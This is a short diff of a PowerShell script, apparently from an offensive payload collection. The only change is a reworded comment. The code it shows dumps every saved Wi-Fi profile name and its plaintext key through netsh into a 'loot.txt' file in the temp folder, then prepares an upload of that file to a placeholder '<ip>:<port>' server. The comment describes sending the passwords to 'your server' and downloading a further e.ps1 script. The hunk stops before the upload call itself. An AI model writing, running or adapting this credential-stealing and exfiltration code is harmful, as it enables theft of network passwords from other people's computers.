@@ -1,4 +1,4 @@
-<# Modify ip/port to download e.ps1 & upload loot.txt too #>
+<# This script will read all wlan SSID's and passwords in plaintext and upload them to your server. Modify ip/port to download e.ps1 & upload loot.txt #>
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > $env:TEMP\loot.txt
 $url = "http://<ip>:<port>/"
 $file = "$env:TEMP\loot.txt"
